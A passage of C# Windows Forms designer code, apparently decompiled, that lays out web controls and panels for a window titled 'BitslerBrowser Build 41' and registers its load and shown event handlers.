      this.webControl2.BackColor = Color.White;
      this.webControl2.Dock = DockStyle.Fill;
      this.webControl2.Location = new Point(0, 0);
      this.webControl2.Name = "webControl2";
      this.webControl2.Size = new Size(1626, 1017);
      this.webControl2.TabIndex = 8;
      this.webControl2.Text = "webControl2";
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1626, 1017);
      this.Controls.Add((Control) this.webControl1);
      this.Controls.Add((Control) this.p);
      this.Controls.Add((Control) this.panel2);
      this.Controls.Add((Control) this.panel1);
      this.Controls.Add((Control) this.webControl2);
      this.Margin = new Padding(4, 5, 4, 5);
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "BitslerBrowser Build 41";
      this.WindowState = FormWindowState.Maximized;
      this.Load += new EventHandler(this.Form1_Load);
      this.Shown += new EventHandler(this.Form1_Shown);
      this.panel3.ResumeLayout(false);
      this.panel3.PerformLayout();
      this.pnl_Main.ResumeLayout(false);
      this.pnl_Main.PerformLayout();
      this.panel2.ResumeLayout(false);
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      this.ResumeLayout(false);
}
  	}
	}

